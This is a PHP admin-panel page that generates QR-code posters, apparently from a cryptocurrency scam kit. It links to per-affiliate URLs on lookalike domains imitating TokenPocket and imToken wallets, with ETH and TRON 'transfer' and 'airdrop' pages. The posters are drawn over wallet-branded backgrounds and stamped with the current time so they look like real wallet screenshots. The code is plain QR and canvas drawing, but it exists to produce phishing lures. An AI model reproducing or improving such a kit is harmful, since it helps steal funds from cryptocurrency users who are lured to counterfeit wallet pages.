





<?php

$shareurl="https://3dmgames.cf/";


?>



<div class="content-wrapper">
    <!-- Content Header (Page header) -->
    <section class="content-header">
        <h1>
            <i class="fa fa-users"></i> 二维码生成
            <small>Add, Edit, Delete</small>
        </h1>
    </section>

    <style> 
    .imgdiv{
    /* height: 1400px;1080*2340
    width: 650px; */
    width: 540px;
    height: 1170.5px;
    
    /* background-color: #6699FF; */
    border: 2px dashed #003366;
    margin: 20px;
    float: left;
    text-align: center;
    }
    .imgdiv > span{
        font-size: 40px;
        
    }
    .shwoImg{
        width:378px;
        height:819.2px;
    }
    


</style>


 <!--<br>-->
        <a href="https://tokenpocket1.com?s=<?php echo $userId ?>">TP钱包系统</a>
 <!--       <br>-->
 <!--        <br>-->
 <!--       <a href="https://tronair.3dmgames.cf?s=<?php echo $userId ?>">TRON空投系统（trc20）</a>-->
 <!--       <br>-->
 <!--       <br><br>-->
 <!--<p><a href="https://cli.im/url">空投页面，复制链接到这里生成二维码</a></p>-->
 <!--   <div class="imgdiv">-->
 <!--   <span>eth转账</span><br/>-->
 <!--   <a id="im1" href="<?php echo 'https://eth.3dmgames.cf?s='.$userId?>"><?php echo 'https://eth.3dmgames.cf?s='.$userId?></a><br/>-->

 <!--   <div class="showPoster">-->
 <!--   <img id="showImg1" class="shwoImg"/>-->
    <!-- <div style="width:100%;height:100px">长按图片保存到手机相册</div> -->
 <!--   </div>-->
 <!--   </div>-->
 <!--   <div class="imgdiv">-->
 <!--   <span>Tron转账</span><br/>-->
 <!--   <a id="im2" href="<?php echo 'https://tron.3dmgames.cf?s='.$userId?>"><?php echo 'https://tron.3dmgames.cf?s='.$userId?></a><br/>-->

 <!--   <div class="showPoster">-->
 <!--   <img id="showImg2" class="shwoImg"/>-->
    <!-- <div style="width:100%;height:100px">长按图片保存到手机相册</div> -->
 <!--   </div>-->
 <!--   </div>-->

    


<div>
 <!--二维码画布-->
<div id="qrcodeCanvas" style="position: absolute;left:-2000px;">123</div>
<!--海报图画布-->
<canvas id="myCanvas" style="position: absolute;right:-2000PX"></canvas>
<!--展示海报-->

</div>



</div>
<script type="text/javascript" src="<?php echo base_url(); ?>assets/js/common.js" charset="utf-8"></script>
<script type="text/javascript">


    jQuery(document).ready(function(){
        jQuery('ul.pagination li a').click(function (e) {
            e.preventDefault();
            var link = jQuery(this).get(0).href;
            var value = link.substring(link.lastIndexOf('/') + 1);
            jQuery("#searchList").attr("action", baseURL + "userListing/" + value);
            jQuery("#searchList").submit();
        });
        down(1)
        window.setTimeout("down(2)", 1000);
    });

    function down(num){
        var href="";
        if(num==1){
            href=$("#im1").attr('href');
        }else if (num==2){
            href=$("#im2").attr('href');
        }
        console.log(href);
        shareImg(href,num);


    }
</script>
<script type="text/javascript" src="//static.runoob.com/assets/qrcode/qrcode.min.js"></script>
<script type="text/javascript">
var qrcodeImg;      //二维码img
function shareImg(url,num){
    // $.showLoading('图片生成中...');
    //移除已生成的避免重复(必须！)
    $('#qrcodeCanvas').html("");
    var qrcode = new QRCode('qrcodeCanvas', {
          text: url,
          width: 300,
          height: 300,
          colorDark: '#000000',
          colorLight: '#ffffff',
          
          correctLevel: QRCode.CorrectLevel.M
    });
    qrcodeImg = $("#qrcodeCanvas img")[0]
    qrcodeImg.crossOrigin = "anonymous"
    // beginDraw(num);

    //画海报
    var width  = 864
    var height = 1832
    var c      = document.getElementById("myCanvas");
    c.width    = width
    c.height   = height
    var ctx    = c.getContext("2d");
    //首先画上背景图

    //注意：H5中任何图片写入画布都是以img 例如（<img src="123.png">）,以下代码console.log() 出来就是它
    var img = new Image();
    img.src =  "<?php echo base_url(); ?>assets/images/imtoken"+num+".jpg";
    img.crossOrigin = "anonymous"
    // 加载完成执行
    //写入文本必须重新定义颜色，否则会被覆盖
    //填充颜色
    ctx.fillStyle ="#fff";
    ctx.fillRect(0,0,width,height);
    //写入文字
    // ctx.fillStyle ="#000";
    // // ctx.font ="90px 微软雅黑";
    // // ctx.fillText("长按识别二维码",300,height-1234);
    // ctx.fillText( "Top-g", 100, 300 );  
    
    
    img.onload = function() {
        //画入背景图
        ctx.drawImage(img,0,0,width,height);
        //画入二维码
        if(num==1){
            ctx.drawImage(qrcodeImg,220,height-1234,425,425);
        }else{
            ctx.drawImage(qrcodeImg,220,height-1362,425,425);
        }
        
var myDate = new Date();
        var tt=myDate.getHours()+":"+myDate.getMinutes();
        
        ctx.font = 'bold 29px "微软雅黑"';
			ctx.fillStyle = "black";
			ctx.textBaseline = "top";
			ctx.fillText(tt, 150, 40);
        
        //绘制完成,转为图片
        setTimeout(function() { 
            base64_path = c.toDataURL("image/jpeg",1);
            $('#showImg'+num).attr('src',base64_path)
            // $.hideLoading();
            $('.mask').show()
            $('.showPoster').show()

            // this.downloadFile('测试.png', base64_path);
        },100)
    }

}

</script>



